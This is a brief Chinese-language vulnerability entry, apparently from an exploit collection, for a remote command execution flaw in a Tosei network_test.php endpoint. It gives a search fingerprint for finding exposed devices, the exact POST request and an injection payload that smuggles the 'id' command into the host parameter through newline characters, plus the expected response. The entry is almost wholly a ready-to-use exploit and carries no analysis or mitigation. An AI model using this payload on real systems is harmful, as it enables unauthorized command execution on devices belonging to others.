# Toseinetwork_test存在远程命令执行漏洞

Toseinetwork ｜ 命令执行 ｜ —
- **指纹**：`body="tosei_login_check.php"`
- **请求**：`POST /cgi-bin/login.php/cgi-bin/network_test.php HTTP/1.1`

**Payload**
```
host=%0aid%0a&command=ping
```
- **响应特征**：200